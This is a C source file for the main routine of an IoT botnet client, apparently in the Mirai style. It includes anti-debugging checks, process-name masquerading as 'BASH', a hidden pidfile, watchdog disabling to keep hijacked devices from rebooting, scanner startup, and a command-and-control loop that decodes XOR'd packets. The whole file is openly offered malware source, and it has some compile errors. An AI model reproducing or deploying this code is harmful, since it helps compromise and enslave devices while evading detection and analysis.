#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/time.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include "xhdrs/includes.h"
#include "xhdrs/net.h"
#include "xhdrs/packet.h"
#include "xhdrs/scanner.h"
//#include "xhdrs/sha256.h"
#include "xhdrs/table.h"
#include "xhdrs/utils.h"

FILE *pidfd;
time_t proc_startup;
sig_atomic_t exiting = 0;

uint32_t table_key = 0xdeadbeef; // util_strxor; For packets only?

static int sockfd = -1, fd_ctrl = -1;
static char uniq_id[32] = "";
static char *pidfile = "/tmp/.bash";

#ifndef DEBUG
static int num_traps = 0;
#define SPC_DEBUGGER_PRESENT (num_traps == 0)
#endif

static void init_exit(void)
{
    if(!access(pidfile, F_OK) && !access(pidfile, R_OK))
	{
#ifdef DEBUG
		util_msgc("Info", "Removing PIDFILE: %s", pidfile);
#endif
		remove(pidfile);
    }

#ifdef DEBUG	
	util_msgc("Info", "Process ran for %ld second(s).", 
		(time(NULL) - proc_startup));
	util_msgc("Info", "Exiting: now");
#endif
}

#ifdef DEBUG
static void sigexit(int signo)
{
    exiting = 1;
	init_exit();
}

static void init_signals(void)
{
    struct sigaction sa;
    sigset_t ss;
	
	util_msgc("Info", "Debug mode active!");
	
    sigemptyset(&ss);
    sa.sa_handler = sigexit;
    sa.sa_mask = ss;
    sa.sa_flags = 0;
    sigaction(SIGINT, &sa, 0);
	
	util_msgc("Info", "Initiated Signals!");
}
#else
static void init_signals(void)
{
    struct sigaction sa;
    sigset_t ss;
	
    sigemptyset(&ss);
    sa.sa_handler = SIG_IGN;
    sa.sa_mask = ss;
    sa.sa_flags = 0;
    sigaction(SIGCHLD, &sa, 0);
}
#endif

static void init_uniq_id(void)
{
	int fd, rc, offset;
	char tmp_uniqid[21], final_uniqid[41];
	
	fd = open("/dev/urandom", O_RDONLY);
	if(fd < 0)
	{
#ifdef DEBUG
		util_msgc("Error", "open(urandom)");
#endif
		_exit(EXIT_FAILURE);
	}
	
	rc = read(fd, tmp_uniqid, 20);
	if(rc < 0)
	{
#ifdef DEBUG
		util_msgc("Error", "read(urandom)");
#endif
		_exit(EXIT_FAILURE);
	}
	
	close(fd);
	
	for(offset = 0; offset < 20; offset++)
	{
		sprintf((final_uniqid + (2 * offset)), 
			"%02x", tmp_uniqid[offset] & 0xff);
	}
	
	sprintf(uniq_id, "%s", final_uniqid);
#ifdef DEBUG
	util_msgc("Info", "Your Machine ID is %s", uniq_id);
#endif
	
    {
        unsigned seed;
        read(fd, &seed, sizeof(seed));
        srandom(seed);
    }
}

#ifndef DEBUG
static void dbg_trap(int signo)
{
    num_traps++;
}

int spc_trap_detect(void)
{
    if(signal(SIGTRAP, dbg_trap) == SIG_ERR)
        return 0;
    
    raise(SIGTRAP);
    
    return 1;
}

static void init_trap_detect(void)
{
	int i;
	
	spc_trap_detect();
	for(i = 0; i < 10; i++)
	{
		if(SPC_DEBUGGER_PRESENT)
			_exit(EXIT_FAILURE);
	}
	
	if(getenv("LD_PRELOAD"))
		_exit(EXIT_FAILURE);
	
	if(ptrace(PTRACE_TRACEME, 0, 0, 0) < 0)
		_exit(EXIT_FAILURE);
}
#endif

static void kill_instance_by_pid(void)
{
	unsigned int pidc;
	
	// Check pidfile is existant and readable
	if(!access(pidfile, F_OK) && !access(pidfile, R_OK))
	{
		if((pidfd = fopen(pidfile, "r+")) != NULL)
		{
#ifdef DEBUG
			util_msgc("Info", "Attempting to kill rouge process!");
#endif
			while(fscanf(pidfd, "%d", &pidc) == 2);
			fclose(pidfd);
			kill(pidc, SIGKILL);
			remove(pidfile);
		}
	}
}

static void ensure_single_instance(void)
{
	int val = 1;
	static BOOL local_bind = TRUE;
    
	struct sockaddr_in addr;
	
    if((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        return;
	
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
    
	net_set_nonblocking(fd_ctrl);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = atoi(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if(bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) < 0)
    {
        if(errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
		
		/*
#ifdef DEBUG
        util_msgc("Info", "Another instance is already running (errno = %d)! "
			"Sending kill request...", errno);
#endif
		
        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_LOOPBACK;
        addr.sin_port = atoi(SINGLE_INSTANCE_PORT);
		
        if(connect(fd_ctrl, (struct sockaddr*)&addr, sizeof(struct sockaddr_in)) < 0)
        {
#ifdef DEBUG
			util_msgc("Error", "Failed to connect to fd_ctrl "
				"to request process termination");
#endif
        }
        */
		
        close(fd_ctrl);
        kill_instance_by_pid();
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if(listen(fd_ctrl, 1) < 0)
        {
#ifdef DEBUG
            util_msgc("Error", "Failed to call listen() on fd_ctrl");
            close(fd_ctrl);
            kill_instance_by_pid();
            ensure_single_instance();
#endif
        }
		
		// Put our PID into pidfile
		if((pidfd = fopen(pidfile, "a+")) != NULL)
		{
			fprintf(pidfd, "%d", getpid());
			fclose(pidfd);
		}
		
#ifdef DEBUG
        util_msgc("Info", "We are the only process on this system!");
#endif
    }
}

#ifndef DEBUG
static void ensure_background_process(void)
{
	int status;
	pid_t pid1, pid2;
	
	if((pid1 = fork()))
	{
		waitpid(pid1, &status, 0);
		_exit(EXIT_FAILURE);
	}
	else if(!pid1)
	{
		if((pid2 = fork()))
			_exit(EXIT_FAILURE);
	}
}
#endif

int main(int argc, char *argv[])
{
	ssize_t buflen;
	char pktbuf[512];
	
#ifdef DEBUG
	struct in_addr ip4;
#endif
	struct Packet pkt;
	
	proc_startup = time(NULL);
	
	init_signals();
	init_uniq_id();
	
	LOCAL_ADDR = net_local_addr();
	
	ensure_single_instance();
	
#ifndef DEBUG	
	init_trap_detect();
	
	ensure_background_process();
	
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
	
	int i;
	for(i = 0; argv[0][i] != 0; i++)
		argv[0][i] = 0;
	// Hide Argv0 name
	strcpy(argv[0], "BASH");
	// Hide Process name
	prctl(PR_SET_NAME, "BASH");
	
	chdir("/")
	
	// Prevent watchdog from rebooting device
	if((wfd = open("/dev/watchdog", 2)) != -1 ||
		(wfd = open("/dev/misc/watchdog", 2)) != -1)
	{
        int one = 1;
		ioctl(wfd, 0x80045704, &one);
		close(wfd);
	}
#endif
	
	table_init();

#ifndef DEBUG
	int tbl_exec_succ_len;
	char *tbl_exec_succ;
	
    // Print out system exec
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);
#endif
	
	scanner_init();
	
	while(!exiting)
	{
		while((sockfd = net_connect("localhost", "3448", IPPROTO_TCP)) < 0)
		{
			if(exiting)
				break;
#ifdef DEBUG
			util_msgc("Info", "Unable to connect, retrying...");
#endif
			util_sleep(1);
		}
		
#ifdef DEBUG
		if(!exiting)
		{
			ip4.s_addr = LOCAL_ADDR;
			util_msgc("Info", "Connected to cnc, local_addr = %s", 
				inet_ntoa(ip4));
		}
#endif
		
		while(!exiting)
		{
			memset(pktbuf, 0, sizeof(pktbuf));
			
			if(read(sockfd, pktbuf, 1) == 0)
			{
				close(sockfd);
				break;
			}
			
			//memset(pktbuf, 0, sizeof(pktbuf));
			
			while(memset(pktbuf, 0, sizeof(pktbuf)) && 
				(buflen = recv(sockfd, pktbuf, sizeof(pktbuf), 0)))
			{
				if(exiting)
					break;
				
				if(buflen != sizeof(struct Packet))
					continue;
				
				memcpy(&pkt, pktbuf, buflen);
				
				util_strxor(pkt.msg.payload, pkt.msg.payload, pkt.msg.length);
				
#ifdef DEBUG
				// Packet received
				util_msgc("Info", "We've received a %s!", util_type2str(pkt.type));
#endif
				switch(pkt.type)
				{
					case PING:
#ifdef DEBUG
						util_msgc("Info", "Ping from cnc!");
#endif
						net_fdsend(sockfd, PONG, "");
					break;
					
					case MESSAGE:
#ifdef DEBUG
						util_msgc("Info", "Message from cnc!");
						util_msgc("Message", "Payload: %s", pkt.msg.payload);
#endif
					break;
				} // Switch
			} // While
			sleep(1);
		} // While
#ifdef DEBUG
		if(!exiting)
			util_msgc("Info", "Lost connection to cnc!");
#endif
	} // While
	
	close(sockfd);
	
	return EXIT_SUCCESS;
}
